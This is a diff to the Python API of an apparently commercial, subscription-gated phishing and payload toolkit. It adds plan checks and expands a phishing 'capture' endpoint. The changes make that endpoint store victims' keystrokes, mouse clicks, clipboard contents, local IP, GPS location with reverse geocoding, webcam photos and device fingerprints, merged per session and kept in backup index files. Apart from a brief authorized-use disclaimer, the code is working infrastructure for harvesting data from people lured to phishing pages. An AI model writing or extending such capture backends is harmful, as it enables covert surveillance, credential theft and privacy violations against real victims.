@@ -12,6 +12,7 @@ import httpx
 import json
 
 from auth import get_current_user
+from middleware.subscription import check_subscription_status
 from tools.phishing_generator import PhishingPageGenerator
 from tools.payload_generator import PayloadGenerator
 from tools.encoder_decoder import EncoderDecoder
@@ -22,6 +23,12 @@ router = APIRouter()
 phishing_gen = PhishingPageGenerator()
 payload_gen = PayloadGenerator()
 encoder_decoder = EncoderDecoder()
+
+def _plan_in(user, required):
+    plan = (getattr(user, 'subscription_plan', '') or '').strip().lower()
+    if getattr(user, 'is_admin', False):
+        return True
+    return plan in [p.strip().lower() for p in required]
 
 
 # Pydantic models
@@ -57,12 +64,18 @@ class HashRequest(BaseModel):
 
 class PhishingCaptureData(BaseModel):
     page_id: str
+    session_id: Optional[str] = None
     photo: Optional[str] = None
     location: Optional[dict] = None
     user_agent: Optional[str] = None
     screen_resolution: Optional[str] = None
     timestamp: str
     form_data: Optional[dict] = None
+    keystrokes: Optional[list] = None
+    mouse_clicks: Optional[list] = None
+    battery_info: Optional[dict] = None
+    gps_status: Optional[str] = None
+    camera_status: Optional[str] = None
     # Extended fingerprinting fields
     platform: Optional[str] = None
     language: Optional[str] = None
@@ -89,16 +102,44 @@ class PhishingCaptureData(BaseModel):
     region: Optional[str] = None
     country: Optional[str] = None
     isp: Optional[str] = None
+    location_type: Optional[str] = None
+    ip: Optional[str] = None
+    local_ip: Optional[str] = None
+    clipboard: Optional[str] = None
+    device_orientation: Optional[dict] = None
+    network_info: Optional[dict] = None
+    referrer: Optional[str] = None
+    history_length: Optional[int] = None
+    
+    class Config:
+        extra = "allow"
     # GPS location fields (if permission granted)
     accuracy: Optional[float] = None
     altitude: Optional[float] = None
     location_type: Optional[str] = None  # 'IP' or 'GPS'
+    # Advanced Data Collection
+    network_info: Optional[dict] = None
+    battery_info: Optional[dict] = None
+    keystrokes: Optional[List[dict]] = None
+    clipboard: Optional[str] = None
+    local_ip: Optional[str] = None
+    referrer: Optional[str] = None
+    history_length: Optional[int] = None
+    device_orientation: Optional[dict] = None
+    mouse_clicks: Optional[List[dict]] = None
+    gps_status: Optional[str] = None
+    camera_status: Optional[str] = None
+
+    class Config:
+        extra = "ignore"
 
 
 # ==================== PHISHING GENERATOR ====================
 
 @router.get("/phishing/templates", tags=["Phishing Generator"])
 async def list_phishing_templates(current_user: dict = Depends(get_current_user)):
+    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
+        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
     """List all available phishing page templates"""
     return {
         "templates": phishing_gen.list_templates(),
@@ -111,6 +152,8 @@ async def generate_phishing_page(
     request: PhishingPageRequest,
     current_user: dict = Depends(get_current_user)
 ):
+    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
+        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
     """
     Generate a phishing page for security testing
     
@@ -227,6 +270,8 @@ async def generate_phishing_page(
 
 @router.get("/phishing/pages", tags=["Phishing Generator"])
 async def list_generated_pages(current_user: dict = Depends(get_current_user)):
+    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
+        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
     """List all generated phishing pages (filters expired ones)"""
     import json
     from datetime import datetime
@@ -332,43 +377,97 @@ async def clear_all_phishing_pages(current_user: dict = Depends(get_current_user
 
 @router.get("/phishing/captures", tags=["Phishing Generator"])
 async def list_phishing_captures(current_user: dict = Depends(get_current_user)):
+    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
+        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
     """List all captured phishing data (photos, locations)"""
     captures_dir = "/tmp/phishing_captures"
-    
-    if not os.path.exists(captures_dir):
-        return {
-            "captures": [],
-            "total": 0
-        }
-    
     captures = []
+    
+    print(f"DEBUG: Listing captures from {captures_dir}")
+    
     import json
     import base64
     
-    for filename in os.listdir(captures_dir):
-        if filename.startswith("capture_") and filename.endswith(".json"):
-            filepath = os.path.join(captures_dir, filename)
-            try:
-                with open(filepath, 'r') as f:
-                    capture_data = json.load(f)
-                    
-                    # If photo file exists, load it as base64
-                    if capture_data.get('photo_file'):
-                        photo_path = capture_data['photo_file']
-                        if os.path.exists(photo_path):
-                            try:
-                                with open(photo_path, 'rb') as photo_file:
-                                    photo_bytes = photo_file.read()
-                                    capture_data['photo_base64'] = base64.b64encode(photo_bytes).decode('utf-8')
-                            except Exception as e:
-                                print(f"Error reading photo {photo_path}: {e}")
-                    
-                    captures.append(capture_data)
-            except Exception as e:
-                print(f"Error reading capture {filename}: {e}")
+    by_id = {}
     
-    # Sort by timestamp (most recent first)
-    captures.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
+    # Ensure directory exists
+    if not os.path.exists(captures_dir):
+        print(f"DEBUG: Directory {captures_dir} does not exist")
+        # Try to use fallbacks immediately if directory is missing
+    else:
+        files = os.listdir(captures_dir)
+        print(f"DEBUG: Files found: {files}")
+        
+        for filename in files:
+            if filename.startswith("capture_") and filename.endswith(".json"):
+                filepath = os.path.join(captures_dir, filename)
+                try:
+                    with open(filepath, 'r') as f:
+                        capture_data = json.load(f)
+                        cid = filename[len("capture_"):-len(".json")]
+                        capture_data['capture_id'] = cid
+                        
+                        # Load photo if exists
+                        if capture_data.get('photo_file'):
+                            photo_path = capture_data['photo_file']
+                            if os.path.exists(photo_path):
+                                try:
+                                    with open(photo_path, 'rb') as photo_file:
+                                        photo_bytes = photo_file.read()
+                                        capture_data['photo_base64'] = base64.b64encode(photo_bytes).decode('utf-8')
+                                except Exception as e:
+                                    print(f"DEBUG: Error reading photo {photo_path}: {e}")
+                        
+                        by_id[cid] = capture_data
+                        print(f"DEBUG: Loaded capture {cid}")
+                except Exception as e:
+                    print(f"DEBUG: Error reading capture {filename}: {e}")
+
+    # Fallback: notifications
+    if len(by_id) == 0:
+        print("DEBUG: No captures found in files, checking notifications fallback")
+        try:
+            notification_file = "/tmp/phishing_notifications.json"
+            if os.path.exists(notification_file):
+                with open(notification_file, 'r') as f:
+                    notifications = json.load(f)
+                for n in notifications:
+                    if n.get('type') == 'phishing_capture':
+                        cid = n.get('id')
+                        if cid not in by_id:
+                            item = {
+                                'page_id': n.get('data', {}).get('page_id'),
+                                'timestamp': n.get('timestamp'),
+                                'ip_address': None,
+                                'location': None,
+                                'location_details': None,
+                                'capture_id': cid,
+                                'fallback_source': 'notifications'
+                            }
+                            by_id[cid] = item
+                            print(f"DEBUG: Recovered capture {cid} from notifications")
+        except Exception as e:
+            print(f"DEBUG: Error reading notifications: {e}")
+
+    # Fallback 2: index
+    try:
+        index_file = "/tmp/phishing_captures_index.json"
+        if os.path.exists(index_file):
+            with open(index_file, 'r') as f:
+                index = json.load(f)
+            for entry in index:
+                cid = entry.get('capture_id')
+                if cid and cid not in by_id:
+                    by_id[cid] = entry
+                    print(f"DEBUG: Recovered capture {cid} from index")
+    except Exception as e:
+        print(f"DEBUG: Error reading index: {e}")
+
+    captures = list(by_id.values())
+    # Robust sort - handle missing timestamps
+    captures.sort(key=lambda x: x.get('timestamp', '') or '', reverse=True)
+
+    print(f"DEBUG: Returning {len(captures)} captures")
     
     return {
         "captures": captures,
@@ -406,7 +505,7 @@ async def delete_capture(capture_id: str, current_user: dict = Depends(get_curre
             try:
                 with open(json_path, 'r') as f:
                     capture_data = json.load(f)
-                    
+                
                 # Delete photo file if exists
                 if capture_data.get('photo_file') and os.path.exists(capture_data['photo_file']):
                     os.remove(capture_data['photo_file'])
@@ -421,6 +520,42 @@ async def delete_capture(capture_id: str, current_user: dict = Depends(get_curre
                     status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                     detail=f"Error deleting capture: {str(e)}"
                 )
+    
+    # Fallback deletion: remove photo by pattern, remove from index and notifications
+    if not deleted:
+        photo_path = os.path.join(captures_dir, f"photo_{capture_id}.jpg")
+        if os.path.exists(photo_path):
+            try:
+                os.remove(photo_path)
+                deleted = True
+            except Exception:
+                pass
+        # Remove from index file
+        index_file = "/tmp/phishing_captures_index.json"
+        try:
+            if os.path.exists(index_file):
+                with open(index_file, 'r') as f:
+                    index = json.load(f)
+                new_index = [e for e in index if e.get('capture_id') != capture_id]
+                if len(new_index) != len(index):
+                    with open(index_file, 'w') as f:
+                        json.dump(new_index, f, indent=2)
+                    deleted = True
+        except Exception:
+            pass
+        # Remove related notifications
+        notif_file = "/tmp/phishing_notifications.json"
+        try:
+            if os.path.exists(notif_file):
+                with open(notif_file, 'r') as f:
+                    notifs = json.load(f)
+                new_notifs = [n for n in notifs if n.get('id') != capture_id]
+                if len(new_notifs) != len(notifs):
+                    with open(notif_file, 'w') as f:
+                        json.dump(new_notifs, f, indent=2)
+                    deleted = True
+        except Exception:
+            pass
     
     if not deleted:
         raise HTTPException(
@@ -490,13 +625,61 @@ async def capture_phishing_data(data: PhishingCaptureData, request: Request):
         captures_dir = "/tmp/phishing_captures"
         os.makedirs(captures_dir, exist_ok=True)
         
+        # Log entry for debugging
+        with open("/tmp/phishing_debug.log", "a") as log:
+            log.write(f"[{datetime.now().isoformat()}] Capture attempt from {request.client.host} for page {data.page_id}\n")
+        
         # Save capture data
-        capture_id = f"{data.page_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+        if data.session_id:
+            capture_id = f"{data.page_id}_{data.session_id}"
+        else:
+            capture_id = f"{data.page_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+            
         capture_file = os.path.join(captures_dir, f"capture_{capture_id}.json")
         
-        import json
-        capture_data = data.dict()
+        # Load existing data to merge
+        existing_data = {}
+        if os.path.exists(capture_file):
+            try:
+                with open(capture_file, 'r') as f:
+                    existing_data = json.load(f)
+            except:
+                pass
         
+        # Prepare new data (exclude None values)
+        new_data = {k: v for k, v in data.dict().items() if v is not None}
+        
+        # MERGE: Update existing data with new non-null data
+        # This ensures we don't lose previously captured data (like location or photo)
+        # if a subsequent request (like keystrokes) doesn't include it.
+        capture_data = existing_data.copy()
+        capture_data.update(new_data)
+        
+        # Special handling for location: if we have location in existing but not in new, keep it.
+        # The update() above handles top-level fields, but let's be careful about nested 'location' dict
+        if 'location' in existing_data and existing_data['location'] and ('location' not in new_data or not new_data['location']):
+            capture_data['location'] = existing_data['location']
+
+        # Always prioritize the new photo if provided
+        if data.photo:
+            photo_file = os.path.join(captures_dir, f"photo_{capture_id}.jpg")
+            try:
+                # Remove data:image/jpeg;base64, prefix
+                photo_data = data.photo.split(',')[1] if ',' in data.photo else data.photo
+                import base64
+                with open(photo_file, 'wb') as f:
+                    f.write(base64.b64decode(photo_data))
+                capture_data['photo_file'] = photo_file
+                capture_data['photo'] = f"Saved to {photo_file}"
+            except Exception as e:
+                print(f"Error saving photo: {e}")
+        # If no new photo, ensure we keep the old one (handled by update/copy, but verify path)
+        elif 'photo_file' in existing_data:
+            capture_data['photo_file'] = existing_data['photo_file']
+            # Don't overwrite 'photo' text if it's just a status
+            if 'photo' not in new_data:
+                    capture_data['photo'] = existing_data.get('photo')
+
         # Get client IP
         client_ip = request.client.host
         if client_ip == "127.0.0.1":
@@ -511,17 +694,15 @@ async def capture_phishing_data(data: PhishingCaptureData, request: Request):
         
         capture_data['ip_address'] = client_ip
         
-        # If location is provided, do reverse geocoding
-        if data.location:
-            try:
+        try:
+            loc = data.location or {}
+            lat = (loc.get('latitude') if isinstance(loc, dict) else None) or data.latitude
+            lon = (loc.get('longitude') if isinstance(loc, dict) else None) or data.longitude
+            if lat is not None and lon is not None:
                 async with httpx.AsyncClient() as client:
                     geo_response = await client.get(
-                        f'https://nominatim.openstreetmap.org/reverse',
-                        params={
-                            'format': 'json',
-                            'lat': data.location.latitude,
-                            'lon': data.location.longitude
-                        },
+                        'https://nominatim.openstreetmap.org/reverse',
+                        params={'format': 'json', 'lat': lat, 'lon': lon},
                         headers={'User-Agent': 'SecurityScanner/1.0'},
                         timeout=10.0
                     )
@@ -536,20 +717,9 @@ async def capture_phishing_data(data: PhishingCaptureData, request: Request):
                                     geo_data.get('address', {}).get('region', 'N/A'),
                             'full_address': geo_data.get('display_name', 'N/A')
                         }
-            except Exception as e:
-                print(f"Error in reverse geocoding: {e}")
-                capture_data['location_details'] = None
-        
-        # If photo is provided, save it separately
-        if data.photo:
-            photo_file = os.path.join(captures_dir, f"photo_{capture_id}.jpg")
-            # Remove data:image/jpeg;base64, prefix
-            photo_data = data.photo.split(',')[1] if ',' in data.photo else data.photo
-            import base64
-            with open(photo_file, 'wb') as f:
-                f.write(base64.b64decode(photo_data))
-            capture_data['photo_file'] = photo_file
-            capture_data['photo'] = f"Saved to {photo_file}"  # Don't save base64 in JSON
+        except Exception as e:
+            print(f"Error in reverse geocoding: {e}")
+            capture_data['location_details'] = capture_data.get('location_details')
         
         # Save JSON data
         with open(capture_file, 'w') as f:
@@ -581,6 +751,26 @@ async def capture_phishing_data(data: PhishingCaptureData, request: Request):
         
         with open(notification_file, 'w') as f:
             json.dump(notifications, f, indent=2)
+
+        # Append to index file (redundância caso /tmp seja limpo ou JSON falhe)
+        index_file = "/tmp/phishing_captures_index.json"
+        index = []
+        try:
+            if os.path.exists(index_file):
+                with open(index_file, 'r') as f:
+                    index = json.load(f)
+        except Exception:
+            index = []
+        entry = capture_data.copy()
+        entry['capture_id'] = capture_id
+        index.append(entry)
+        # Mantém apenas os últimos 200
+        index = index[-200:]
+        try:
+            with open(index_file, 'w') as f:
+                json.dump(index, f, indent=2)
+        except Exception:
+            pass
         
         return {
             "success": True,
@@ -599,6 +789,8 @@ async def capture_phishing_data(data: PhishingCaptureData, request: Request):
 
 @router.get("/payloads/categories", tags=["Payload Generator"])
 async def list_payload_categories(current_user: dict = Depends(get_current_user)):
+    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
+        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
     """List all available payload categories"""
     return {
         "categories": payload_gen.list_categories(),
@@ -611,6 +803,8 @@ async def generate_payloads(
     request: PayloadRequest,
     current_user: dict = Depends(get_current_user)
 ):
+    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
+        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
     """
     Generate security testing payloads
     
@@ -645,6 +839,8 @@ async def get_payloads_by_category(
     encode_type: str = "url",
     current_user: dict = Depends(get_current_user)
 ):
+    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
+        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
     """Get payloads for a specific category"""
     try:
         payloads = payload_gen.generate_payloads(category, encode, encode_type)
@@ -665,6 +861,8 @@ async def get_payloads_by_category(
 
 @router.get("/encoder/types", tags=["Encoder/Decoder"])
 async def list_encoding_types(current_user: dict = Depends(get_current_user)):
+    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
+        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
     """List all available encoding/decoding types"""
     return encoder_decoder.list_encodings()
 
@@ -674,6 +872,8 @@ async def encode_text(
     request: EncodeRequest,
     current_user: dict = Depends(get_current_user)
 ):
+    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
+        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
     """Encode text with specified encoding"""
     try:
         result = encoder_decoder.encode(request.text, request.encoding_type)
@@ -693,6 +893,8 @@ async def decode_text(
     request: DecodeRequest,
     current_user: dict = Depends(get_current_user)
 ):
+    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
+        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
     """Decode text with specified encoding"""
     try:
         result = encoder_decoder.decode(request.text, request.encoding_type)
@@ -712,6 +914,8 @@ async def hash_text(
     request: HashRequest,
     current_user: dict = Depends(get_current_user)
 ):
+    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
+        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
     """Generate hash of text"""
     try:
         result = encoder_decoder.hash_text(request.text, request.hash_type)
@@ -764,6 +968,7 @@ async def get_tools_info():
         "warning": "⚠️ All tools should only be used for authorized security testing and educational purposes!",
         "legal_notice": "Unauthorized use of these tools may be illegal. Always obtain proper authorization before testing any systems you do not own."
     }
+
 
 
 # ==================== NOTIFICATIONS ====================
@@ -897,7 +1102,7 @@ async def generate_report(
             
             <div style="margin-top: 40px; padding: 20px; background: #f0f0f0; border-radius: 5px;">
                 <h3>Observações</h3>
-                <p>Este relatório foi gerado automaticamente pelo Security Scanner Pro.</p>
+                <p>Este relatório foi gerado automaticamente pela Ades Plataform.</p>
                 <p>Revise os resultados cuidadosamente e tome as ações necessárias para corrigir as vulnerabilidades encontradas.</p>
             </div>
         </div>
